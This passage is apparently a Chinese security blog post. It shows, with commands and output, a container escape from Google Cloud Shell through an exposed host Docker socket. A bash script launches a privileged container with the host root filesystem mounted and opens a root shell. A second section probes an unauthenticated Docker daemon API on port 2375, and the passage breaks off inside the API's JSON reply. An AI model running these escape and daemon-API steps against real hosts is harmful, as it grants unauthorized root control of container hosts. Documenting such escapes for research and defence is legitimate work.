<h1 id="google-cloud-shell-docker逃逸">google-cloud-shell-docker逃逸</h1>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">docker</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">unix</span><span class="p">:</span><span class="c1">///google/host/var/run/docker.sock pull alpine:latest</span>
<span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">Cloud</span> <span class="nx">Shell</span><span class="o">!</span> <span class="nx">Type</span> <span class="dl">"</span><span class="s2">help</span><span class="dl">"</span> <span class="nx">to</span> <span class="kd">get</span> <span class="nx">started</span><span class="p">.</span>
<span class="nx">Your</span> <span class="nx">Cloud</span> <span class="nx">Platform</span> <span class="nx">project</span> <span class="k">in</span> <span class="k">this</span> <span class="nx">session</span> <span class="nx">is</span> <span class="kd">set</span> <span class="nx">to</span> <span class="nx">avid</span><span class="o">-</span><span class="nx">rope</span><span class="o">-</span><span class="mi">267508</span><span class="p">.</span>
<span class="nx">Use</span> <span class="err">“</span><span class="nx">gcloud</span> <span class="nx">config</span> <span class="kd">set</span> <span class="nx">project</span> <span class="p">[</span><span class="nx">PROJECT_ID</span><span class="p">]</span><span class="err">”</span> <span class="nx">to</span> <span class="nx">change</span> <span class="nx">to</span> <span class="nx">a</span> <span class="nx">different</span> <span class="nx">project</span><span class="p">.</span>
<span class="nx">chihou_pro</span><span class="p">@</span><span class="nd">cloudshell</span><span class="p">:</span><span class="o">~</span> <span class="p">(</span><span class="nx">avid</span><span class="o">-</span><span class="nx">rope</span><span class="o">-</span><span class="mi">267508</span><span class="p">)</span><span class="nx">$</span> <span class="nx">sudo</span> <span class="nx">su</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">cs</span><span class="o">-</span><span class="mi">6000</span><span class="o">-</span><span class="nx">devshell</span><span class="o">-</span><span class="nx">vm</span><span class="o">-</span><span class="nx">d336a485</span><span class="o">-</span><span class="mi">4</span><span class="nx">d57</span><span class="o">-</span><span class="mi">485</span><span class="nx">b</span><span class="o">-</span><span class="nx">bd84</span><span class="o">-</span><span class="mi">220</span><span class="nx">ac5dd5619</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">chihou_pro</span><span class="err">#</span> <span class="nx">ls</span>
<span class="nx">README</span><span class="o">-</span><span class="nx">cloudshell</span><span class="p">.</span><span class="nx">txt</span>
</code></pre></div></div>
<!--
![GitHub](https://avatars2.githubusercontent.com/u/3265208?v=3&s=100 =260x100 "GitHub,Social Coding")
-->

<p>很明显的看到，使用了docker容器，<a href="https://xz.aliyun.com/t/6982" title="helloworld:)">参考</a>：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">cs</span><span class="o">-</span><span class="mi">6000</span><span class="o">-</span><span class="nx">devshell</span><span class="o">-</span><span class="nx">vm</span><span class="o">-</span><span class="nx">d336a485</span><span class="o">-</span><span class="mi">4</span><span class="nx">d57</span><span class="o">-</span><span class="mi">485</span><span class="nx">b</span><span class="o">-</span><span class="nx">bd84</span><span class="o">-</span><span class="mi">220</span><span class="nx">ac5dd5619</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">chihou_pro</span><span class="err">#</span> <span class="nx">cat</span> <span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="nx">cgroup</span>
<span class="mi">12</span><span class="p">:</span><span class="nx">hugetlb</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">11</span><span class="p">:</span><span class="nx">perf_event</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">10</span><span class="p">:</span><span class="nx">cpu</span><span class="p">,</span><span class="nx">cpuacct</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">9</span><span class="p">:</span><span class="nx">cpuset</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">8</span><span class="p">:</span><span class="nx">memory</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">7</span><span class="p">:</span><span class="nx">devices</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">6</span><span class="p">:</span><span class="nx">freezer</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">5</span><span class="p">:</span><span class="nx">blkio</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">4</span><span class="p">:</span><span class="nx">rdma</span><span class="p">:</span><span class="o">/</span>
<span class="mi">3</span><span class="p">:</span><span class="nx">pids</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">2</span><span class="p">:</span><span class="nx">net_cls</span><span class="p">,</span><span class="nx">net_prio</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">1</span><span class="p">:</span><span class="nx">name</span><span class="o">=</span><span class="nx">systemd</span><span class="p">:</span><span class="o">/</span><span class="nx">kubepods</span><span class="o">/</span><span class="nx">besteffort</span><span class="o">/</span><span class="nx">pod9621f4ca5c9abb70e26317dc85781dd7</span><span class="o">/</span><span class="mi">2</span><span class="nx">a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b</span>
<span class="mi">0</span><span class="p">::</span><span class="o">/</span><span class="nx">system</span><span class="p">.</span><span class="nx">slice</span><span class="o">/</span><span class="nx">containerd</span><span class="p">.</span><span class="nx">service</span>
</code></pre></div></div>

<h2 id="发现docker">发现docker</h2>
<p>我们可以看到<code class="language-plaintext highlighter-rouge">kubepods</code>等关键词，浏览了文件系统之后，注意到有2个Docker unix套接字可用。在<code class="language-plaintext highlighter-rouge">/run/docker.sock</code>中，这是我们在Cloud Shell中运行的Docker客户端的默认路径。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">cs</span><span class="o">-</span><span class="mi">6000</span><span class="o">-</span><span class="nx">devshell</span><span class="o">-</span><span class="nx">vm</span><span class="o">-</span><span class="nx">d336a485</span><span class="o">-</span><span class="mi">4</span><span class="nx">d57</span><span class="o">-</span><span class="mi">485</span><span class="nx">b</span><span class="o">-</span><span class="nx">bd84</span><span class="o">-</span><span class="mi">220</span><span class="nx">ac5dd5619</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">cat</span> <span class="nx">run</span><span class="o">/</span>
<span class="nx">docker</span><span class="o">/</span>         <span class="nx">docker</span><span class="p">.</span><span class="nx">sock</span>     <span class="nx">google</span><span class="o">/</span>         <span class="nx">metrics</span><span class="o">/</span>        <span class="nx">postgresql</span><span class="o">/</span>     <span class="nx">sshd</span><span class="o">/</span>           <span class="nx">supervisor</span><span class="p">.</span><span class="nx">pid</span>  <span class="nx">xtables</span><span class="p">.</span><span class="nx">lock</span>
<span class="nx">docker</span><span class="p">.</span><span class="nx">pid</span>      <span class="nx">docker</span><span class="o">-</span><span class="nx">ssd</span><span class="p">.</span><span class="nx">pid</span>  <span class="nx">lock</span><span class="o">/</span>           <span class="nx">mount</span><span class="o">/</span>          <span class="nx">rsyslogd</span><span class="p">.</span><span class="nx">pid</span>    <span class="nx">sshd</span><span class="p">.</span><span class="nx">pid</span>        <span class="nx">utmp</span>
</code></pre></div></div>
<p>/google/host/var/run/docker.sock套接字，这是第二个。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">cs</span><span class="o">-</span><span class="mi">6000</span><span class="o">-</span><span class="nx">devshell</span><span class="o">-</span><span class="nx">vm</span><span class="o">-</span><span class="nx">d336a485</span><span class="o">-</span><span class="mi">4</span><span class="nx">d57</span><span class="o">-</span><span class="mi">485</span><span class="nx">b</span><span class="o">-</span><span class="nx">bd84</span><span class="o">-</span><span class="mi">220</span><span class="nx">ac5dd5619</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">ls</span> <span class="o">/</span><span class="nx">google</span><span class="o">/</span><span class="nx">host</span><span class="o">/</span><span class="kd">var</span><span class="sr">/run/</span>
<span class="nx">agetty</span><span class="p">.</span><span class="nx">reload</span>  <span class="nx">cloud</span><span class="o">-</span><span class="nx">init</span>        <span class="nx">command</span><span class="o">-</span><span class="nx">recorder</span>  <span class="nx">crash_reporter</span>  <span class="nx">docker</span>      <span class="nx">dockershim</span><span class="p">.</span><span class="nx">sock</span>  <span class="nx">initctl</span>  <span class="nx">lockbox</span>  <span class="nx">lvm</span>         <span class="nx">metrics</span>  <span class="nx">sshd</span><span class="p">.</span><span class="nx">pid</span>  <span class="nx">systemd</span>  <span class="nx">tmpfiles</span><span class="p">.</span><span class="nx">d</span>  <span class="nx">user</span>  <span class="nx">vm</span>
<span class="nx">blkid</span>          <span class="nx">cloudshell</span><span class="o">-</span><span class="nx">creds</span>  <span class="nx">containerd</span>        <span class="nx">dbus</span>            <span class="nx">docker</span><span class="p">.</span><span class="nx">pid</span>  <span class="nx">docker</span><span class="p">.</span><span class="nx">sock</span>      <span class="nx">lock</span>     <span class="nx">log</span>      <span class="nx">machine</span><span class="o">-</span><span class="nx">id</span>  <span class="nx">mount</span>    <span class="nx">sudo</span>      <span class="nx">theia</span>    <span class="nx">udev</span>        <span class="nx">utmp</span>  <span class="nx">xtables</span><span class="p">.</span><span class="nx">lock</span>
</code></pre></div></div>
<p>然后根据上面的可利用套接字准备一个bash文件进行docker逃逸:-)
new a bash file to escape docker in google_cloud_shell.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">docker</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">unix</span><span class="p">:</span><span class="c1">///google/host/var/run/docker.sock pull alpine:latest</span>
<span class="nx">sudo</span> <span class="nx">docker</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">unix</span><span class="p">:</span><span class="c1">///google/host/var/run/docker.sock run -d -it --name LiveOverflow-container -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest</span>
<span class="nx">sudo</span> <span class="nx">docker</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">unix</span><span class="p">:</span><span class="c1">///google/host/var/run/docker.sock start LiveOverflow-container</span>
<span class="nx">sudo</span> <span class="nx">docker</span> <span class="o">-</span><span class="nx">H</span> <span class="nx">unix</span><span class="p">:</span><span class="c1">///google/host/var/run/docker.sock exec -it LiveOverflow-container /bin/sh</span>
</code></pre></div></div>

<p>运行bash文件</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">cs</span><span class="o">-</span><span class="mi">6000</span><span class="o">-</span><span class="nx">devshell</span><span class="o">-</span><span class="nx">vm</span><span class="o">-</span><span class="nx">d336a485</span><span class="o">-</span><span class="mi">4</span><span class="nx">d57</span><span class="o">-</span><span class="mi">485</span><span class="nx">b</span><span class="o">-</span><span class="nx">bd84</span><span class="o">-</span><span class="mi">220</span><span class="nx">ac5dd5619</span><span class="p">:</span><span class="o">/</span><span class="nx">home</span><span class="o">/</span><span class="nx">chihou_pro</span><span class="err">#</span> <span class="nx">bash</span> <span class="nx">docker_escape</span><span class="p">.</span><span class="nx">sh</span>
<span class="nx">latest</span><span class="p">:</span> <span class="nx">Pulling</span> <span class="k">from</span> <span class="nx">library</span><span class="o">/</span><span class="nx">alpine</span>
<span class="nx">Digest</span><span class="p">:</span> <span class="nx">sha256</span><span class="p">:</span><span class="mi">39</span><span class="nx">eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01</span>
<span class="nx">Status</span><span class="p">:</span> <span class="nx">Image</span> <span class="nx">is</span> <span class="nx">up</span> <span class="nx">to</span> <span class="nx">date</span> <span class="k">for</span> <span class="nx">alpine</span><span class="p">:</span><span class="nx">latest</span>
<span class="nx">docker</span><span class="p">.</span><span class="nx">io</span><span class="o">/</span><span class="nx">library</span><span class="o">/</span><span class="nx">alpine</span><span class="p">:</span><span class="nx">latest</span>
<span class="nx">docker</span><span class="p">:</span> <span class="nb">Error</span> <span class="nx">response</span> <span class="k">from</span> <span class="nx">daemon</span><span class="p">:</span> <span class="nx">Conflict</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">container</span> <span class="nx">name</span> <span class="dl">"</span><span class="s2">/LiveOverflow-container</span><span class="dl">"</span> <span class="nx">is</span> <span class="nx">already</span> <span class="k">in</span> <span class="nx">use</span> <span class="nx">by</span> <span class="nx">container</span> <span class="dl">"</span><span class="s2">2e2896994c459d7be0a6acb613c8be509ef5158cb97ddac4b5e30b2fed770d56</span><span class="dl">"</span><span class="p">.</span> <span class="nx">You</span> <span class="nx">have</span> <span class="nx">to</span> <span class="nx">remove</span> <span class="p">(</span><span class="nx">or</span> <span class="nx">rename</span><span class="p">)</span> <span class="nx">that</span> <span class="nx">container</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">able</span> <span class="nx">to</span> <span class="nx">reuse</span> <span class="nx">that</span> <span class="nx">name</span><span class="p">.</span>
<span class="nx">See</span> <span class="dl">'</span><span class="s1">docker run --help</span><span class="dl">'</span><span class="p">.</span>
<span class="nx">LiveOverflow</span><span class="o">-</span><span class="nx">container</span>
<span class="o">/</span> <span class="err">#</span> <span class="nx">whoami</span>
<span class="nx">root</span>
</code></pre></div></div>
<p>如上，逃逸成功</p>

<hr />
<hr />
<hr />

<h1 id="docker-daemon-api漏洞复现">docker daemon api漏洞复现</h1>
<p>验证漏洞存在：</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="nx">root</span><span class="p">@</span><span class="nd">iZ2ze9ebgot9gy5c2mi5ecZ</span> <span class="nx">unauthorized</span><span class="o">-</span><span class="nx">rce</span><span class="p">]</span><span class="err">#</span> <span class="nx">curl</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//vuln_docker_ip:2375/info</span>
<span class="p">{</span><span class="dl">"</span><span class="s2">ID</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">OY55:HR25:LKHP:XTLU:LCID:Y64D:46WQ:4T5U:U2SF:5PVW:R7I3:T6KV</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Containers</span><span class="dl">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="dl">"</span><span class="s2">ContainersRunning</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="dl">"</span><span class="s2">ContainersPaused</span><span class="dl">"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">"</span><span class="s2">ContainersStopped</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="dl">"</span><span class="s2">Images</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="dl">"</span><span class="s2">Driver</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">overlay2</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">DriverStatus</span><span class="dl">"</span><span class="p">:[[</span><span class="dl">"</span><span class="s2">Backing Filesystem</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">extfs</span><span class="dl">"</span><span class="p">],[</span><span class="dl">"</span><span class="s2">Supports d_type</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">],[</span><span class="dl">"</span><span class="s2">Native Overlay Diff</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">true</span><span class="dl">"</span><span class="p">]],</span><span class="dl">"</span><span class="s2">SystemStatus</span><span class="dl">"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="dl">"</span><span class="s2">Plugins</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">Volume</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">local</span><span class="dl">"</span><span class="p">],</span><span class="dl">"</span><span class="s2">Network</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">bridge</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">macvlan</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">null</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">overlay</span><span class="dl">"</span><span class="p">],</span><span class="dl">"</span><span class="s2">Authorization</span><span class="dl">"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="dl">"</span><span class="s2">Log</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">awslogs</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">fluentd</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">gcplogs</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">gelf</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">journald</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">json-file</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">logentries</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">splunk</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">syslog</span><span class="dl">"</span><span class="p">]},</span><span class="dl">"</span><span class="s2">MemoryLimit</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">SwapLimit</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">KernelMemory</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">CpuCfsPeriod</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">CpuCfsQuota</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">CPUShares</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">CPUSet</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">IPv4Forwarding</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">BridgeNfIptables</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">BridgeNfIp6tables</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">Debug</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">NFd</span><span class="dl">"</span><span class="p">:</span><span class="mi">29</span><span class="p">,</span><span class="dl">"</span><span class="s2">OomKillDisable</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">NGoroutines</span><span class="dl">"</span><span class="p">:</span><span class="mi">51</span><span class="p">,</span><span class="dl">"</span><span class="s2">SystemTime</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">2020-05-22T02:44:08.778253143Z</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">LoggingDriver</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">json-file</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">CgroupDriver</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">cgroupfs</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">NEventsListener</span><span class="dl">"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">"</span><span class="s2">KernelVersion</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">3.10.0-1062.12.1.el7.x86_64</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">OperatingSystem</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">Alpine Linux v3.7 (containerized)</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">OSType</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">linux</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Architecture</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">x86_64</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">IndexServerAddress</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">https://index.docker.io/v1/</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">RegistryConfig</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">AllowNondistributableArtifactsCIDRs</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">AllowNondistributableArtifactsHostnames</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">InsecureRegistryCIDRs</span><span class="dl">"</span><span class="p">:[</span><span class="dl">"</span><span class="s2">127.0.0.0/8</span><span class="dl">"</span><span class="p">],</span><span class="dl">"</span><span class="s2">IndexConfigs</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">docker.io</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">Name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">docker.io</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Mirrors</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">Secure</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">Official</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">}},</span><span class="dl">"</span><span class="s2">Mirrors</span><span class="dl">"</span><span class="p">:[]},</span><span class="dl">"</span><span class="s2">NCPU</span><span class="dl">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="dl">"</span><span class="s2">MemTotal</span><span class="dl">"</span><span class="p">:</span><span class="mi">3973296128</span><span class="p">,</span><span class="dl">"</span><span class="s2">GenericResources</span><span class="dl">"</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="dl">"</span><span class="s2">DockerRootDir</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">/var/lib/docker</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">HttpProxy</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">HttpsProxy</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">NoProxy</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">Name</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">14e1a228e781</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Labels</span><span class="dl">"</span><span class="p">:[],</span><span class="dl">"</span><span class="s2">ExperimentalBuild</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">ServerVersion</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">18.03.0-ce</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">ClusterStore</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">ClusterAdvertise</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">Runtimes</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">runc</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">path</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">docker-runc</span><span class="dl">"</span><span class="p">}},</span><span class="dl">"</span><span class="s2">DefaultRuntime</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">runc</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Swarm</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">NodeID</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">NodeAddr</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">LocalNodeState</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">inactive</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">ControlAvailable</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">Error</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">RemoteManagers</span><span class="dl">"</span><span class="p">:</span><span class="kc">null</span><span class="p">},</span><span class="dl">"</span><span class="s2">LiveRestoreEnabled</span><span class="dl">"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="dl">"</span><span class="s2">Isolation</span><span class="dl">"</span><span class="p">:</span><span class="dl">""</span><span class="p">,</span><span class="dl">"</span><span class="s2">InitBinary</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">docker-init</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">ContainerdCommit</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">ID</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">cfd04396dc68220d1cecbe686a6cc3aa5ce3667c</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Expected</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">cfd04396dc68220d1cecbe686a6cc3aa5ce3667c</span><span class="dl">"</span><span class="p">},</span><span class="dl">"</span><span class="s2">RuncCommit</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">ID</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">4fc53a81fb7c994640722ac585fa9ca548971871</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Expected</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">4fc53a81fb7c994640722ac585fa9ca548971871</span><span class="dl">"</span><span class="p">},</span><span class="dl">"</span><span class="s2">InitCommit</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">ID</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">949e6fa</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">Expected</span><span class="dl">"</span><span class="p">:</span><span 